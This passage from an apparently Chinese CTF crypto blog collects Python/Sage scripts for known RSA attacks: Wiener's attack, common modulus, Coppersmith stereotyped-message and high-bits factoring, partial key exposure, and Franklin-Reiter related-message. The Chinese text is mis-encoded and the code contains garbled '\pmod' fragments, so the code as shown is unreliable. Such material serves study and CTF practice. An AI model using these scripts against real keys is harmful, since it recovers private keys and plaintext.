class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> \<span class="title">pmodInverse</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    d such that de = 1 (\pmod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">totient</span><span class="params">(p,q)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Calculates the totient of pq</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitlength</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Calculates the bitlength of x</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">assert</span> x &gt;= <span class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        x = x&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Calculates the integer square root</span></span><br><span class="line"><span class="string">    for arbitrary large nonnegative integers</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'square root not defined for negative numbers'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    a, b = div\pmod(bitlength(n), <span class="number">2</span>)</span><br><span class="line">    x = <span class="number">2</span>**(a+b)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = (x + n//x)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> y &gt;= x:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        x = y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_perfect_square</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    If n is a perfect square it returns sqrt(n),</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    otherwise returns -1</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    h = n &amp; <span class="number">0xF</span>; <span class="comment">#last hexadecimal "digit"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> h &gt; <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> <span class="comment"># return immediately in 6 cases out of 16.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of Boolean short-circuit evaluation</span></span><br><span class="line">    <span class="keyword">if</span> ( h != <span class="number">2</span> <span class="keyword">and</span> h != <span class="number">3</span> <span class="keyword">and</span> h != <span class="number">5</span> <span class="keyword">and</span> h != <span class="number">6</span> <span class="keyword">and</span> h != <span class="number">7</span> <span class="keyword">and</span> h != <span class="number">8</span> ):</span><br><span class="line">        <span class="comment"># take square root if you must</span></span><br><span class="line">        t = isqrt(n)</span><br><span class="line">        <span class="keyword">if</span> t*t == n:</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"\nHacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469</span></span><br><span class="line">    e = <span class="number">27587468384672288862881213094354358587433516035212531881921186101712498639965289973292625430363076074737388345935775494312333025500409503290686394032069</span></span><br><span class="line">    d=hack_RSA(e,n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"d="</span>)</span><br><span class="line">    <span class="keyword">print</span> (d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šè‹¥å¹²æ¬¡åŠ å¯†ï¼Œeä¸åŒï¼Œnç›¸åŒï¼Œmç›¸åŒã€‚å°±å¯ä»¥åœ¨ä¸åˆ†è§£nå’Œæ±‚dçš„å‰æä¸‹ï¼Œè§£å‡ºæ˜æ–‡mã€‚</p><p>é¦–å…ˆï¼Œä¸¤ä¸ªåŠ å¯†æŒ‡æ•°äº’è´¨ï¼š<br>gcd(e1,e2)=1</p><p>å³å­˜åœ¨s1ã€s2ä½¿å¾—ï¼š<br>s1*e1+s2*e2=1</p><p>åˆå› ä¸ºï¼š<br>c1\equiv m^e1^ \pmod n<br>c2\equiv m^e2^\pmod n</p><p>ä¸¤æ¡å¼å­åˆ†åˆ«æ±‚ä¸€ä¸ªï¼ˆs1,s2ï¼‰æ¬¡æ–¹ç„¶åç›¸ä¹˜ï¼ŒåŒ–ç®€å¯å¾—ï¼š<br>c1^s1^ * c2^s2^ \equiv  m \pmod n</p><p>å³å¯æ±‚å‡ºæ˜æ–‡</p><p>exp:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">a</span> == <span class="number">0</span>:</span><br><span class="line">      return (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, <span class="attr">x</span> = egcd(b % a, a)</span><br><span class="line">      return (g, x - (b // a) * y, y)</span><br><span class="line">def \pmodinv(a, m):</span><br><span class="line">    g, x, <span class="attr">y</span> = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      raise Exception('\pmodular inverse does not exist')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      return x % m</span><br><span class="line"></span><br><span class="line"><span class="attr">c1=</span></span><br><span class="line"><span class="attr">n=</span></span><br><span class="line"><span class="attr">e1=0xc21000af014a98b2455dec479</span></span><br><span class="line"><span class="attr">c2=</span></span><br><span class="line"><span class="attr">e2=0x9935842d63b75899ddd81b467</span></span><br><span class="line"></span><br><span class="line"><span class="attr">s</span> = egcd(e1, e2)</span><br><span class="line"><span class="attr">s1</span> = s[<span class="number">1</span>]</span><br><span class="line"><span class="attr">s2</span> = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s1</span> = - s1</span><br><span class="line">   <span class="attr">c1</span> = \pmodinv(c1, n)</span><br><span class="line">elif s2&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s2</span> = - s2</span><br><span class="line">   <span class="attr">c2</span> = \pmodinv(c2, n)</span><br><span class="line"><span class="attr">m=(pow(c1,s1,n)*pow(c2,s2,n))</span> % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p> mï¼Œeç›¸åŒï¼Œä¸åŒçš„æ˜¯cå’Œnï¼Œæœ‰ï¼š<br>$c_1 \equiv m^e \pmod n_1$<br>$c_2 \equiv m^e \pmod n_2$<br>$c_3 \equiv m^e \pmod n_3$<br>â€¦<br>$c_n \equiv m^e \pmod n_n$ </p><p> $c_x \equiv m^n \pmod n_1n_2n_3\cdot\cdot\cdot n_n$ </p><h2 id="Stereotyped-messages"><a href="#Stereotyped-messages" class="headerlink" title="Stereotyped messages"></a>Stereotyped messages</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥æ¨¡Nï¼ŒåŠ å¯†æŒ‡æ•°eå’Œæ˜æ–‡mé«˜ä½ï¼Œä½ä½è¢«éšè—ï¼Œè¢«éšè—éƒ¨åˆ†ä½æ•°å°äºN^1/e^</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">load(<span class="string">"coppersmith.sage"</span>)</span><br><span class="line">N = <span class="comment">#Nçš„å€¼</span></span><br><span class="line">e = 3 <span class="comment">#eçš„å€¼ï¼Œè¶Šå°è¶Šå¥½</span></span><br><span class="line">m = <span class="comment">#mçš„å¤§æ¦‚å€¼</span></span><br><span class="line">c = <span class="comment">#cçš„å€¼</span></span><br><span class="line">Z\pmodN = Z\pmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Z\pmodN)</span><br><span class="line">f = (m + x)^e - c</span><br><span class="line">dd = f.degree()</span><br><span class="line">beta = 1</span><br><span class="line">epsilon = beta / 7</span><br><span class="line">mm = ceil(beta**2 / (dd * epsilon))</span><br><span class="line">tt = floor(dd * mm * ((1/beta) - 1))</span><br><span class="line">XX = ceil(N**((beta**2/dd) - epsilon))</span><br><span class="line">roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)</span><br></pre></td></tr></table></figure><h2 id="Factoring-with-high-bits-known"><a href="#Factoring-with-high-bits-known" class="headerlink" title="Factoring with high bits known"></a>Factoring with high bits known</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥æ¨¡Nï¼ŒåŠ å¯†æŒ‡æ•°eå’Œpçš„é«˜ä½ï¼Œä½ä½è¢«éšè—</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = 22696911229312659874738074899439457992248152730689278378819946543149357610634329627984531087669062301926875187991182013947223281619853855162918766480848703174390569130081348181282805736755296880728550799307081115704956570914024661831937343894022737660587549552490238277573409387371217121560461324557186812257740503722584510585462069159075200526635606677601131918281509060592393387176124235153517358363746584271646274866120051265119261146517578970232485246878726837916075299577720139317038118148106209530054587167536851896450431919312820852962596852961803405916618990419802746573064712215199008529683745905254572071511</span><br><span class="line"></span><br><span class="line">p = 147074002227133415720722266940278347837547446773140845973255972106195457070706386163214468466076525180963060306764217202402383643362009058035825033180123579226158735283108796018103129215920313383728956742526028603758044612649550810818410129300570667873028005104616597743709185068463293745855509286927802040320</span><br><span class="line">p_new = (p&gt;&gt;200)&lt;&lt;200</span><br><span class="line">pbits = 1024</span><br><span class="line">kbits = 200</span><br><span class="line">pbar = p_new &amp; (2^pbits-2^kbits)</span><br><span class="line">print <span class="string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Z\pmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0] <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">print x0 + pbar</span><br></pre></td></tr></table></figure><h2 id="Partial-Key-Exposure-Attack-éƒ¨åˆ†ç§é’¥æš´éœ²æ”»å‡»"><a href="#Partial-Key-Exposure-Attack-éƒ¨åˆ†ç§é’¥æš´éœ²æ”»å‡»" class="headerlink" title="Partial Key Exposure Attack(éƒ¨åˆ†ç§é’¥æš´éœ²æ”»å‡»)"></a>Partial Key Exposure Attack(éƒ¨åˆ†ç§é’¥æš´éœ²æ”»å‡»)</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥æ¨¡Nï¼ŒåŠ å¯†æŒ‡æ•°eå’Œdçš„ä½ä½ï¼Œé«˜ä½è¢«éšè—</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def partial_p(p0, kbits, n):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Z\pmod(n))</span><br><span class="line">    <span class="attr">nbits</span> = n.nbits()</span><br><span class="line"></span><br><span class="line">    <span class="attr">f</span> = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    <span class="attr">f</span> = f.monic()</span><br><span class="line">    <span class="attr">roots</span> = f.small_roots(<span class="attr">X=2^(nbits//2-kbits),</span> <span class="attr">beta=0.3)</span>  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        <span class="attr">x0</span> = roots[<span class="number">0</span>]</span><br><span class="line">        <span class="attr">p</span> = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        return ZZ(p)</span><br><span class="line"></span><br><span class="line">def find_p(d0, kbits, e, n):</span><br><span class="line">    <span class="attr">X</span> = var('X')</span><br><span class="line"></span><br><span class="line">    for k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        <span class="attr">results</span> = solve_\pmod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*<span class="attr">n</span> == X], <span class="number">2</span>^kbits)</span><br><span class="line">        for x <span class="keyword">in</span> results:</span><br><span class="line">            <span class="attr">p0</span> = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="attr">p</span> = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                return p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == '__main__':</span><br><span class="line">    <span class="attr">n</span> = <span class="comment">#Nçš„å€¼</span></span><br><span class="line">    <span class="attr">e</span> = <span class="number">3</span></span><br><span class="line">    <span class="attr">d</span> = <span class="comment">#dçš„è¿‘ä¼¼å€¼</span></span><br><span class="line">    <span class="attr">beta</span> = <span class="number">0.5</span></span><br><span class="line">    <span class="attr">epsilon</span> = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">nbits</span> = n.nbits()</span><br><span class="line">    <span class="attr">kbits</span> = <span class="number">511</span></span><br><span class="line">    <span class="attr">d0</span> = d &amp; (<span class="number">2</span>^kbits-<span class="number">1</span>)</span><br><span class="line">    print <span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    <span class="attr">p</span> = find_p(d0, kbits, e, n)</span><br><span class="line">    print <span class="string">"found p: %d"</span> % p</span><br><span class="line">    <span class="attr">q</span> = n//p</span><br><span class="line">    print d</span><br><span class="line">    print inverse_\pmod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="Related-Message-Attack"><a href="#Related-Message-Attack" class="headerlink" title="Related Message Attack"></a>Related Message Attack</h2><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥n,e=3,cä»¥åŠm+paddingçš„å¯†æ–‡xï¼Œæ±‚m        (å°æŒ‡æ•°)</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">def getM2(<span class="keyword">a</span>,b,c1,c2,n):</span><br><span class="line">    a3 = pow(<span class="keyword">a</span>,<span class="number">3</span>,n)</span><br><span class="line">    b3 = pow(b,<span class="number">3</span>,n)</span><br><span class="line">    <span class="keyword">first</span> = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    <span class="keyword">first</span> = <span class="keyword">first</span> % n</span><br><span class="line">    <span class="keyword">second</span> = <span class="number">3</span>*b*(a3*c2-b3)</span><br><span class="line">    <span class="keyword">second</span> = <span class="keyword">second</span> % n</span><br><span class="line">    <span class="keyword">third</span> = <span class="keyword">second</span>*gmpy.invert(<span class="keyword">first</span>,n)</span><br><span class="line">    <span class="keyword">third</span> = <span class="keyword">third</span> % n</span><br><span class="line">    <span class="keyword">fourth</span> = (<span class="keyword">third</span>+b)*gmpy.invert(<span class="keyword">a</span>,n)</span><br><span class="line">    <span class="literal">return</span> <span class="keyword">fourth</span> % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span> = <span class="number">1</span></span><br><span class="line">b = <span class="number">-1</span><span class="comment">#b=padding1-padding2ï¼ˆpaddingæ˜¯åŠ å¯†çš„æ˜æ–‡ä¸æ˜æ–‡çš„å·®ï¼‰</span></span><br><span class="line">c1 = <span class="number">0x7175f2614b8d1a27b43f7c3873b3422658af28291ddc88b15f97f499e00cd4c5c4fd980f062376a61e5dd4c15d52d73262d3c066f1e8f46a04af6fead7c3960d2768a0d214bbc3e05d2f6e56aee158071574e55753624a19e094590fc3f9918a2065cd5ff7693e0d34517bc0072e6c9e444e66c4ece88d657f99e44bee48924</span>L</span><br><span class="line">c2 =<span class="number">0xd5f4af36b5391bd731cfa4313466024ab1bc3b455024a5d8b218faba0e956252f01c4d01bd36765035c33d73e5af7f178aeb2606edf86814d74082c64828fa4c1666b69d05fab69dd1ef47b243356290fdb74e001f54edec70681cf52319c73bce9acda4803a9e97597ca21d60072c2d2b516f161bec1f6a91baa2e24c7655b</span>L</span><br><span class="line">padding2 = <span class="number">1</span></span><br><span class="line">n = <span class="number">0xf2e5339236455e2bc1b1bd12e45b9341a3b223ddb02dec11c880fa4aa8835df9e463e4c446292cd5a2fe19b10017856654b6d6c3f3a94a95807712329f7dae2e1e6506094d5d2f9c8a05c35cbf3366330996db9bff930fe566016d5e850e232057d419292ce30df9c135d56ef1bb72c38838d4b127aa577ceb4aba94d4e0d55</span>L</span><br><span class="line">m = getM2(<span class="keyword">a</span>,b,c1,c2,n)-padding2</span><br><span class="line">print hex(m)</span><br></pre></td></tr></table></figure><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Franklin-Reiter attack against RSA.</span></span><br><span class="line"><span class="comment"># If two messages differ only by a known fixed difference between the two messages</span></span><br><span class="line"><span class="comment"># and are RSA encrypted under the same RSA \pmodulus N</span></span><br><span class="line"><span class="comment"># then it is possible to recover both of them.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inputs are \pmodulus, known difference, ciphertext 1, ciphertext2.</span></span><br><span class="line"><span class="comment"># Ciphertext 1 corresponds to smaller of the two plaintexts. (The one without the fixed difference added to it)</span></span><br><span class="line">def franklinReiter(n,e,r,c1,c2):</span><br><span class="line">    R.&lt;X&gt; = Z\pmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X + r)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="type">Integer</span>(n-(composite\pmodulusGCD(f1,f2)).coefficients()[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite \pmodulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line">def composite\pmodulusGCD(a, b):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> composite\pmodulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">'''def <span class="type">CoppersmithShortPadAttack</span>(e,n,<span class="type">C1</span>,<span class="type">C2</span>,eps=<span class="number">1</span>/<span class="number">30</span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Coppersmith's Shortpad attack!</span></span><br><span class="line"><span class="string">    Figured out from: https://en.wikipedia.org/wiki/Coppersmith's_attack#Coppersmith.E2.80.99s_short-pad_attack</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    P.&lt;x,y&gt; = <span class="type">PolynomialRing</span>(<span class="type">ZZ</span>)</span><br><span class="line">    Z\pmodN = Z\pmod(n)</span><br><span class="line">    g1 = x^e - <span class="type">C1</span></span><br><span class="line">    g2 = (x+y)^e - <span class="type">C2</span></span><br><span class="line">    res = g1.resultant(g2)</span><br><span class="line">    P.&lt;y&gt; = <span class="type">PolynomialRing</span>(Z\pmodN)</span><br><span class="line">    <span class="comment"># Convert Multivariate Polynomial Ring to Univariate Polynomial Ring</span></span><br><span class="line">    rres = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len(res.coefficients())):</span><br><span class="line">        rres += res.coefficients()[i]*(y^(res.exponents()[i][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    diff = rres.small_roots(epsilon=eps)</span><br><span class="line">    recoveredM1 = franklinReiter(n,e,diff[<span class="number">0</span>],<span class="type">C1</span>,<span class="type">C2</span>)</span><br><span class="line">    print(recoveredM1)</span><br><span class="line">    print(<span class="string">"Message is the following hex, but potentially missing some zeroes in the binary from the right end"</span>)</span><br><span class="line">    print(hex(recoveredM1))</span><br><span class="line">    print(<span class="string">"Message is one of:"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        msg = hex(<span class="type">Integer</span>(recoveredM1*pow(<span class="number">2</span>,i)))</span><br><span class="line">        <span class="keyword">if</span>(len(msg)%<span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">            msg = '<span class="number">0</span>' + msg</span><br><span class="line">        <span class="keyword">if</span>(msg[:<span class="number">2</span>]=='<span class="number">0</span>x'):</span><br><span class="line">            msg = msg[:<span class="number">2</span>]</span><br><span class="line">        print(binascii.unhexlify(msg))</span><br><span class="line"></span><br><span class="line">def testCoppersmithShortPadAttack(eps=<span class="number">1</span>/<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">from</span> <span class="type">Crypto</span>.<span class="type">PublicKey</span> <span class="keyword">import</span> <span class="type">RSA</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line">    M = <span 